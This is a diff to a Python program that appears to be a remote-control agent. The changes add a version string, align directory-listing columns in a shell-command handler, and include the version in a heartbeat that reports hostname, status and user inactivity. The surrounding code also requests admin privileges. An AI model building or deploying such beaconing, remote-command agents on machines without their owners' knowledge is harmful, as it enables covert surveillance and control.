@@ -12,6 +12,7 @@ import urllib.error
 import urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+VERSION = "0.0.84"
 
 def request_admin_privileges():
     try:
@@ -449,19 +450,22 @@ def execute_shell_command(cmd_str):
                 if not items:
                     return "Directory is empty"
 
-                # Format output with perfectly aligned columns
+                # Format output with perfectly aligned columns (fixed width)
                 output_lines = []
-                output_lines.append("Name                               Size         Type      ")
-                output_lines.append("─" * 75)
+                # Header with exact column alignment
+                header = f"{'Name':<40}  {'Size':>10}  {'Type':<8}"
+                output_lines.append(header)
+                output_lines.append("─" * len(header))
 
                 for name, size_str, type_str in items:
                     # Truncate long names to fit column (40 chars max)
                     display_name = name if len(name) <= 40 else name[:37] + "..."
 
                     if type_str == "[DIR]":
-                        output_lines.append(f"{display_name:<40}  {size_str:>10}  {type_str}")
+                        line = f"{display_name:<40}  {size_str:>10}  {type_str:<8}"
                     else:
-                        output_lines.append(f"{display_name:<40}  {size_str:>10}")
+                        line = f"{display_name:<40}  {size_str:>10}  {'':<8}"
+                    output_lines.append(line)
 
                 output = "\n".join(output_lines)
                 lines = output.split("\n")
@@ -1026,7 +1030,8 @@ def heartbeat_loop():
             payload = json.dumps({
                 "hostname": hostname,
                 "status": status,
-                "seconds_inactive": seconds_inactive if not is_active else 0
+                "seconds_inactive": seconds_inactive if not is_active else 0,
+                "version": VERSION
             }).encode("utf-8")
 
             req = urllib.request.Request(
